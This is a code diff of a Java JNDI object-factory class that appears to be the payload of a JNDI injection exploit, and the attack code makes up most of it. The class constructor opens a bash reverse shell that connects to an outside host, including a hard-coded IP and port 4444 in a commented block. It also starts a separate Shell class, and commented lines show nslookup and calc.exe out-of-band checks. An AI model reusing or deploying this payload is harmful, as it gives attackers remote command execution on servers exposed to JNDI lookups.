@@ -16,15 +16,22 @@ import java.util.Hashtable;
 public class ExportObject implements javax.naming.spi.ObjectFactory {
     public ExportObject() {
         try {
-            //oob check
-//            Runtime.getRuntime().exec("nslookup jndi.x.artsploit.com");
-//            Runtime.getRuntime().exec("calc.exe");
+            Shell shell = new Shell();
+            shell.start();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        //oob check
+        //            Runtime.getRuntime().exec("nslookup jndi.x.artsploit.com");
+        //            Runtime.getRuntime().exec("calc.exe");
 
-            //Pure Groovy/Java Reverse Shell
-            //snatched from https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76
+        //Pure Groovy/Java Reverse Shell
+        //snatched from https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76
 
-            String lhost = "YOUR SERVER";
-            int lport = PORT_FOR_REVERSE_SHELL;
+        //String lhost = "YOUR SERVER";
+        //int lport = PORT_FOR_REVERSE_SHELL;
+        /*String lhost = "51.15.254.246";
+            int lport = 4444;
 ////            String cmd = "cmd.exe"; //win
             String cmd="/bin/bash"; //linux
             Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
@@ -49,15 +56,15 @@ public class ExportObject implements javax.naming.spi.ObjectFactory {
                 }
             }
             p.destroy();
-            s.close();
+                        s.close();
 
         } catch(Exception e) {
             e.printStackTrace();
-        }
+        }*/
     }
 
     @Override
-    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) {
+    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable < ? , ? > environment) {
         return null;
     }
 }
